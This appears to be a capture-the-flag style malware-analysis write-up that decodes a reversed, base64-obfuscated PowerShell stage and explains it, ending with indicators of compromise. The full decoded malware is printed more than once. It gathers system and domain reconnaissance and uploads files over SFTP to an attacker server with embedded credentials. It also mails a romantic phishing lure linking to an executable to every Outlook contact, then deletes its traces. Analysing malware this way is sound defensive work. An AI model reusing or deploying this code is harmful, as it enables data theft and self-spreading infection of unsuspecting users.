djVmai9UatdVL0V2Rg0DIzV2czV2YvJHUyV2cVRnblJnc1NGJK0gCNU2Yy9mRtASKnQHe05ybm5WaWF0JgIXaERXZnJXY0RCIoRXYQ1ibp9mSoACa0FGUlxWaG1CIlxWaG1Cd19EI8BCbsVnbk4jMgUWdsFmdvACVFdEI0NWdk9mcQNXdylmVpRnbBBCSUFEUgIjclRnblNUe0lmc1NWZTxFdv9mccxlOFNUQQNVRNFkTvAyYp12dK0QZjJ3bG1CIpcCd4RnLzJXZzVHbhN2bsdCIylGR0V2ZyFGdkACa0FGUt4WavpEKggGdhBVZslmRtASZslmRtQXdPBCfgQnb192YjFkclNXVfJzMul2VgM3chx2QtACdjVmai9UatdVL0V2RK0QZjJ3bG1CIpcCd4RnLvZmbpNERnAicpREdldmchRHJggGdhBVLul2bKhCIoRXYQVGbpZULgUGbpZUL0V3TgwHIsxWduRiPyAiTJFUTPRkUFNVV6YnblRiOjRGdld2ck9CI0NXZ0xmbK0gCNU2Yy9mRtASKnQHe05SZtFmbyV2c1dCIylGR0V2ZyFGdkACa0FGUt4WavpEKggGdhBVZslmRtASZslmRtQXdPBCfgIXZzVFduVmcyV3YkoQDK0QfK0AbsVnTtQXdPBCfgU2Yy9mRtAicpREdldmchRHJggGdhBVLgkncvR3YlJXaEBSZwlHVtVGdJ1CItVGdJ1ydl5EIgACIK0wegkSKyVmbpFGdu92QgUGc5RFa0FGUtAicpREdldmchRHJggGdhBVLggGdhBVL0NXZUhCI09mbtgCImlmCNoQDiMXZslmRgMWasJWdQx1YpxmY1BFXzJXZzVFX6MkIg0DIylGR0V2ZyFGdkoQDiMnclNXVcpzQiASPgIXaEh2YyFWZzRiCNoQDn1WakAyczV2YvJHUtQnchR3UK0wZtlGJgUGbpZEd19ULgwmc1RCIpJXVtACdzVWdxVmUiV2VtU2avZnbJpQDK0gImZWa05CZyF2QyVmYtVWTfJXY0NnclBXdTx1ckF2bs52dvREXyV2cVRnblJnc1NGJcNnclNXdcpzQiASPgcWbpRiCNIiZmlGduQmchNkclJWbl10XyFGdzJXZwV3UvADMwkjO0QTMucDOx4iNwIjL0QzLvoDc0RHaiASPgwmc1RiCNUUTB5kUFNVV6YnblRCI9AiclNXV05WZyJXdjRiCNUUTB5kUFRVVQ10TDpjduVGJg0DIl1WYuR3cvhGJ" ;
$enC = $sCrt.ToCharArray() ; [array]::Reverse($enC) ; -join $enC 2>&1> $null ;
$reversed = [String]::new($enC)
Write-Host $reversed
```

Saving this as `reverse.ps1` and then running it using `pwsh reverse.ps1` reveals the base64 string.

*If you don't have PowerShell you can download it from the official [PowerShell github](https://github.com/PowerShell/PowerShell).*

```
JGhvc3RuYW1lID0gJGVudjpDT01QVVRFUk5BTUUNCiRjdXJyZW50VXNlciA9ICRlbnY6VVNFUk5BTUUNCiR1cmwgPSAiaHR0cDovLzQ0LjIwNi4xODcuMTQ0OjkwMDAvU3VwZXJzdGFyX01lbWJlckNhcmQudGlmZiINCiRpbWcgPSAiQzpcdXNlcnNcJGN1cnJlbnRVc2VyXERvd25sb2Fkc1xTdXBlcnN0YXJfTWVtYmVyQ2FyZC50aWZmIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJGltZw0KU3RhcnQtUHJvY2VzcyAkaW1nDQoNCiRzZWFyY2hEaXIgPSAiQzpcVXNlcnMiDQokdGFyZ2V0RGlyID0gIkM6XFVzZXJzXFB1YmxpY1xQdWJsaWMgRmlsZXMiDQoNCmlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJHRhcmdldERpciAtUGF0aFR5cGUgQ29udGFpbmVyKSkgew0KICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHRhcmdldERpciAtRm9yY2UgfCBPdXQtTnVsbA0KfQ0KDQokY3VycmVudFVzZXIgfCBPdXQtRmlsZSAtRmlsZVBhdGggKEpvaW4tUGF0aCAkdGFyZ2V0RGlyICd1c2VybmFtZS50eHQnKSAtRm9yY2UNCg0Kbmx0ZXN0IC9kc2dldGRjOiRlbnY6VVNFUkRPTUFJTiAyPiRudWxsIHwgT3V0LUZpbGUgLUZpbGVQYXRoIChKb2luLVBhdGggJHRhcmdldERpciAnRENpbmZvLnR4dCcpIC1Gb3JjZQ0KR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfVXNlckFjY291bnQgfCBPdXQtRmlsZSAtRmlsZVBhdGggKEpvaW4tUGF0aCAkdGFyZ2V0RGlyICdsb2NhbHVzZXJzLnR4dCcpIC1Gb3JjZQ0Kd21pYyAvTkFNRVNQQUNFOlxccm9vdFxTZWN1cml0eUNlbnRlcjIgUEFUSCBBbnRpVmlydXNQcm9kdWN0IEdFVCAvdmFsdWUgMj4kbnVsbCB8IE91dC1GaWxlIC1GaWxlUGF0aCAoSm9pbi1QYXRoICR0YXJnZXREaXIgJ0FWaW5mby50eHQnKSAtRm9yY2UNCg0KJGN1cnJlbnRVc2VyUHJvY2Vzc2VzID0gR2V0LVdtaU9iamVjdCBXaW4zMl9Qcm9jZXNzIHwgV2hlcmUtT2JqZWN0IHsNCiAgICB0cnkgew0KICAgICAgICAkXy5HZXRPd25lcigpLlVzZXIgLWVxICRjdXJyZW50VXNlcg0KICAgIH0gY2F0Y2ggew0KICAgICAgICAkZmFsc2UgIA0KICAgIH0NCn0NCg0KJGN1cnJlbnRVc2VyUHJvY2Vzc2VzIHwgU2VsZWN0LU9iamVjdCBQcm9jZXNzTmFtZSwgUHJvY2Vzc0lkIHwgT3V0LUZpbGUgLUZpbGVQYXRoIChKb2luLVBhdGggJHRhcmdldERpciAnVXNlclByb2Nlc3Nlcy50eHQnKSAtRm9yY2UNCg0KaWYgKEdldC1Qcm9jZXNzIC1OYW1lIE91dGxvb2sgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsNCiAgICBTdG9wLVByb2Nlc3MgLU5hbWUgT3V0bG9vayAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCn0NCg0KJGV4dExpc3QgPSAgIiouZG9jIiwgIiouZG9jeCIsICIqLnhscyIsICIqLnhsc3giLCAiKi5wcHQiLCAiKi5wcHR4IiwgIioucGRmIiwgIiouY3N2IiwgIi4qb2Z0IiwgIioucG90eCIsIA0KICAgICAgICAgICAgIioueGx0eCIsICIqLmRvdHgiLCAiKi5tc2ciLCAiKi5lbWwiLCAiKi5wc3QiLCAgIioub2R0IiwgIioub2RzIiwgIioub2RwIiwgIioub2RnIiwgIioub3N0Ig0KICAgICAgICAgICAgIA0KJG51bGwgPSBHZXQtQ2hpbGRJdGVtICRzZWFyY2hEaXIgLVJlY3Vyc2UgLUluY2x1ZGUgJGV4dExpc3QgLUZvcmNlIC1FcnJvckFjdGlvbiAnU2lsZW50bHlDb250aW51ZScgfA0KICAgIEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJGRlc3RpbmF0aW9uUGF0aCA9IEpvaW4tUGF0aCAkdGFyZ2V0RGlyICRfLk5hbWUNCiAgICAgICAgDQogICAgICAgIGlmICgkXy5GdWxsTmFtZSAtbmUgJGRlc3RpbmF0aW9uUGF0aCkgew0KICAgICAgICAgICAgQ29weS1JdGVtIC1QYXRoICRfLkZ1bGxOYW1lIC1EZXN0aW5hdGlvbiAkZGVzdGluYXRpb25QYXRoIC1Gb3JjZQ0KICAgICAgICB9DQogICAgfQ0KDQpHZXQtU21iU2hhcmUgfCBPdXQtRmlsZSAtRmlsZVBhdGggKEpvaW4tUGF0aCAkdGFyZ2V0RGlyICdTaGFyZWluZm8udHh0JykgLUZvcmNlDQpncHJlc3VsdCAvciB8IE91dC1GaWxlIC1GaWxlUGF0aCAoSm9pbi1QYXRoICR0YXJnZXREaXIgJ0dQaW5mby50eHQnKSAtRm9yY2UNCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScNCiRhcmNoaXZlUGF0aCA9ICIkdGFyZ2V0RGlyXCRob3N0bmFtZS56aXAiDQpDb21wcmVzcy1BcmNoaXZlIC1QYXRoICR0YXJnZXREaXIgLURlc3RpbmF0aW9uUGF0aCAkYXJjaGl2ZVBhdGggLUZvcmNlIA0KDQokd1ppcFVybCA9ICJodHRwczovL3VzLnNvZnRyYWRhci5jb20vc3RhdGljL3Byb2R1Y3RzL3dpbnNjcC1wb3J0YWJsZS9kaXN0ci8wL3dpbnNjcC1wb3J0YWJsZV9zb2Z0cmFkYXItY29tLnppcCINCiR3WmlwRmlsZSA9ICIkdGFyZ2V0RGlyXFdpblNDUC56aXAiDQokd0V4dHJhY3RQYXRoID0gIkM6XFVzZXJzXFB1YmxpY1xIZWxwRGVzay1Ub29scyINCg0KSW52b2tlLVdlYlJlcXVlc3QgLVVzZXJBZ2VudCAiV2dldCIgLVVyaSAkd1ppcFVybCAtT3V0RmlsZSAkd1ppcEZpbGUgLVVzZUJhc2ljUGFyc2luZw0KRXhwYW5kLUFyY2hpdmUgLVBhdGggJHdaaXBGaWxlIC1EZXN0aW5hdGlvblBhdGggJHdFeHRyYWN0UGF0aCAtRm9yY2UNCg0KJHdFeGVQYXRoID0gIiR3RXh0cmFjdFBhdGhcV2luU0NQLmNvbSINCiRzUGF0aCA9ICIkd0V4dHJhY3RQYXRoXG1haW50ZW5hbmNlU2NyaXB0LnR4dCINCkAiDQpvcGVuIHNmdHA6Ly9zZXJ2aWNlOk04JkMhaTZLa21HTDEtI0AzNS4xNjkuNjYuMTM4LyAtaG9zdGtleT0qDQpwdXQgYCIkYXJjaGl2ZVBhdGhgIg0KY2xvc2UNCmV4aXQNCiJAIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRzUGF0aCAtRm9yY2UNClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICR3RXhlUGF0aCAtQXJndW1lbnRMaXN0ICIvc2NyaXB0PWAiJHNQYXRoYCIiIC1XYWl0IC1Ob05ld1dpbmRvdw0KDQoNCiRvdXRsb29rUGF0aCAgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICJDOlxQcm9ncmFtIEZpbGVzXE1pY3Jvc29mdCBPZmZpY2UiIC1GaWx0ZXIgIk9VVExPT0suRVhFIiAtUmVjdXJzZSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IEZ1bGxOYW1lDQoNCiRodG1sQm9keSA9IEAiDQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQo8c3R5bGU+DQogICAgYm9keSB7DQogICAgZm9udC1mYW1pbHk6IENhbGlicmksIHNhbnMtc2VyaWY7DQogICAgfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPHA+SGV5LCA8L3A+IDxwPiBIb3BlIHlvdSdyZSBkb2luZyBncmVhdCB3aGVuIHlvdSBzZWUgdGhpcy4gSSdtIHJlYWNoaW5nIG91dCBiZWNhdXNlIHRoZXJlJ3Mgc29tZXRoaW5nIEkndmUgYmVlbiB3YW50aW5nIHRvIHNoYXJlIHdpdGggeW91LiBZb3Uga25vdyB0aGF0IGZlZWxpbmcgd2hlbiB5b3UndmUgYmVlbiBhZG1pcmluZyBzb21lb25lIGZyb20gYWZhciwgYnV0IGhlc2l0YXRlZCB0byB0YWtlIHRoZSBuZXh0IHN0ZXA/IFRoYXQncyBiZWVuIG1lIGxhdGVseSwgYnV0IEkndmUgZGVjaWRlZCBpdCdzIHRpbWUgdG8gY2hhbmdlIHRoYXQuPC9wPg0KPHA+SW4gYSB3b3JsZCB3aGVyZSB3ZSBvZnRlbiBydXNoIHRocm91Z2ggZXZlcnl0aGluZywgSSBiZWxpZXZlIGluIHRoZSBiZWF1dHkgb2YgdGFraW5nIHRoaW5ncyBzbG93LCBjaGVyaXNoaW5nIGVhY2ggbW9tZW50IGxpa2UgYSBzY2VuZSBmcm9tIGEgdGltZWxlc3MgdGFsZS4gU28sIGlmIHlvdSdyZSBvcGVuIHRvIGl0LCBJJ2QgbG92ZSBmb3IgdXMgdG8gbWVldCB1cCBhZnRlciBob3Vycy48L3A+DQo8cD5JJ3ZlIGFycmFuZ2VkIGZvciBhIHJlbmRlenZvdXMgYXQgYSBwcml2YXRlIG1lbWJlcnNoaXAgY2x1Yiwgd2hlcmUgd2UgY2FuIGVuam95IGEgYml0IG9mIHByaXZhY3kgYW5kIGV4Y2x1c2l2aXR5LiBJJ3ZlIGF0dGFjaGVkIHRoZSBtYXAgZm9yIHlvdXIgY29udmVuaWVuY2UuIDwvcD4NCjxwPlRvIGdhaW4gZW50cnksIHlvdSdsbCBuZWVkIGEgZGlnaXRhbCBtZW1iZXJzaGlwIGNhcmQgZm9yIGVudHJ5LCBhY2Nlc3NpYmxlIDxhIGhyZWY9J2h0dHA6Ly80NC4yMDYuMTg3LjE0NDo5MDAwL1N1cGVyc3Rhcl9NZW1iZXJDYXJkLnRpZmYuZXhlJz5oZXJlPC9hPi4gSnVzdCBhIGZyaWVuZGx5IGhlYWRzIHVwLCB0aGVyZSdzIGEgdGltZSBsaW1pdCBiZWZvcmUgeW91IGNhbiBkb3dubG9hZCBpdCwgc28gaXQncyBiZXN0IHRvIGdyYWIgaXQgc29vbmVyIHJhdGhlciB0aGFuIHdhaXRpbmcgdG9vIGxvbmcuPC9wPg0KPHA+Q291bnRpbmcgb24gc2VlaW5nIHlvdSB0aGVyZSBsYXRlci48L3A+DQo8L2JvZHk+DQo8L2h0bWw+DQoiQA0KDQppZiAoJG91dGxvb2tQYXRoKSB7DQogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG91dGxvb2tQYXRoDQogICAgJG91dGxvb2sgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgT3V0bG9vay5BcHBsaWNhdGlvbg0KICAgICRuYW1lc3BhY2UgPSAkb3V0bG9vay5HZXROYW1lc3BhY2UoIk1BUEkiKQ0KICAgICRjb250YWN0c0ZvbGRlciA9ICRuYW1lc3BhY2UuR2V0RGVmYXVsdEZvbGRlcigxMCkgDQogICAgJGNzdkZpbGVQYXRoID0gIiR0YXJnZXREaXJcQ29udGFjdHMuY3N2Ig0KICAgICRjb250YWN0c0ZvbGRlci5JdGVtcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJF8uR2V0SW5zcGVjdG9yIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJF8uQ2xvc2UoMCkgIA0KICAgICAgICB9DQogICAgICAgICRwcm9wcyA9IEB7DQogICAgICAgICAgICAnRnVsbCBOYW1lJyAgICAgID0gJF8uRnVsbE5hbWUNCiAgICAgICAgICAgICdFbWFpbCBBZGRyZXNzJyAgPSAkXy5FbWFpbDFBZGRyZXNzDQogICAgICAgICAgICANCiAgICAgICAgfQ0KICAgICAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkcHJvcHMNCiAgICB9IHwgRXhwb3J0LUNzdiAtUGF0aCAkY3N2RmlsZVBhdGggLU5vVHlwZUluZm9ybWF0aW9uDQoNCiAgICAkY29udGFjdHMgPSBJbXBvcnQtQ3N2IC1QYXRoICRjc3ZGaWxlUGF0aA0KICAgICRtYWlsSXRlbSA9ICRvdXRsb29rLkNyZWF0ZUl0ZW0oMCkNCiAgICAkbWFpbEl0ZW0uU3ViamVjdCA9ICJGaW5nZXJzIGNyb3NzZWQgeW91J2xsIG5vdGljZS4uIg0KICAgICRtYWlsSXRlbS5IdG1sQm9keSA9ICRodG1sQm9keQ0KICAgICRtYWlsSXRlbS5BdHRhY2htZW50cy5BZGQoJGltZykgPiAkbnVsbA0KICAgICRtYWlsSXRlbS5Cb2R5Rm9ybWF0ID0gMiANCg0KICAgIGZvcmVhY2ggKCRjb250YWN0IGluICRjb250YWN0cykgew0KICAgICAgICAkYmNjUmVjaXBpZW50ID0gJG1haWxJdGVtLlJlY2lwaWVudHMuQWRkKCRjb250YWN0LiJFbWFpbCBBZGRyZXNzIikNCiAgICAgICAgJGJjY1JlY2lwaWVudC5UeXBlID0gW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5PdXRsb29rLk9sTWFpbFJlY2lwaWVudFR5cGVdOjpvbEJDQw0KICAgIH0NCg0KICAgICRtYWlsSXRlbS5SZWNpcGllbnRzLlJlc29sdmVBbGwoKSA+ICRudWxsDQogICAgJG1haWxJdGVtLlNlbmQoKQ0KfQ0KDQpSZW1vdmUtSXRlbSAtUGF0aCAkd0V4dHJhY3RQYXRoIC1SZWN1cnNlIC1Gb3JjZQ0KUmVtb3ZlLUl0ZW0gLVBhdGggJHRhcmdldERpciAtUmVjdXJzZSAtRm9yY2UNCg==
```

The rest of the script will decode the string from base64 and store it in the `$boom` variable. The script then defines an "alias" `$iLy` which will equate to `Invoke-Expression`, a cmdlet that will evaluate a string and execute it. The `$boom` variable is then passed to the `$iLy` alias, thus executing it. This likely means that this base64 encoded string is most likely the next stage of the malware.

Decoding it using a tool like [CyberChef](https://gchq.github.io/CyberChef) (the 🐐) reveals the next stage of the malware.

```powershell
$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
$img = "C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff"

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = "$targetDir\$hostname.zip"
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p>Counting on seeing you there later.</p>
</body>
</html>
"@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = "$targetDir\Contacts.csv"
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = "Fingers crossed you'll notice.."
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) > $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact."Email Address")
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() > $null
    $mailItem.Send()
}

Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force
```

Here we see the full, un-obfuscated code. 

The start of the script gathers some information about the system, and then downloads a `.tiff` file from `hxxp[://]44[.]206[.]187[.]144:9000` using the cmdlet `Invoke-WebRequest` and opens it.
```powershell
$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
$img = "C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff"

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img
```
If we remember back to the original executable file name, it was masquerading as a `.tiff` file, so this action is likely to further that facade.

The next part of the script creates the folder `C:\Users\Public\Public Files` if it doesn't already exist. It then collects a bunch of information about the system, such as the users on the system, information about the domain controller, any antivirus products installed, running processes, and several other pieces of information. These are stored in various text files within the `C:\Users\Public\Public Files` directory it created. After the reconnaisance is completed the text files are compressed into a `.zip` archive, named after the hostname of the infected system.
```powershell
$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = "$targetDir\$hostname.zip"
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force
```

Following it's reconnaisance, the malware performs exfiltration utilising SFTP (secure file transfer protocol). First, it downloads a zip file, `winscp-portable_softradar-com.zip` and saves it within `C:\Users\Public\HelpDesk-Tools` as `WinSCP.zip`, again utilising the `Invoke-WebRequest` cmdlet.

After some research, the zip file in question appears to contain the program WinSCP.

![WinSCP, a SFTP client for Windows](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-212006.png)

According to their website, the application is an SFTP client for Windows. After extracting WinSCP using the cmdlet `Expand-Archive`, it creates a `maintainenceScript.txt` file that contains some runtime information including the SFTP server to connect to, `35[.]169[.]66[.]138`. The WinSCP executable is then executed, passing in the `maintainenceScript.txt` as an argument, as well as `-NoNewWindow` likely to hide the process from the victim. 

From the script passed to WinSCP, we can assume that the zip archive containing the information gained from the earlier reconaissance is being uploaded to the attacker's SFTP server, hosted on `35[.]169[.]66[.]138`. Interestingly, what looks like a password is also present in this script `M8&C!i6KkmGL1-#`.

```powershell
$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow
```

The next part of this PowerShell script is very interesting. It appears to send an email to propogate itself to everyone in the victim's Outlook contacts, with the email itself reminiscent of the old school [ILOVEYOU](https://en.wikipedia.org/wiki/ILOVEYOU) virus (the `newILY.ps1` script name also references this). The phishing email contains a link to download a "digital membership card", which is just the virus `hxxp[://]44[.]206[.]187[.]144:9000/Superstar_MemberCard[.]tiff[.]exe`.

```powershell
$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p>Counting on seeing you there later.</p>
</body>
</html>
"@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = "$targetDir\Contacts.csv"
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = "Fingers crossed you'll notice.."
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) > $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact."Email Address")
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() > $null
    $mailItem.Send()
}
```

Finally, the script will delete all of the files it created and downloaded.
```powershell
Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force
```
## IOCs
Following analysis of the code, several indicators of compromise (IOCs) can be used to identify infection from this malware.
### Network
- `44[.]206[.]187[.]144`
- `35[.]169[.]66[.]138`
- `hxxps[://]us[.]softradar[.]com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com[.]zip`
### Filesystem
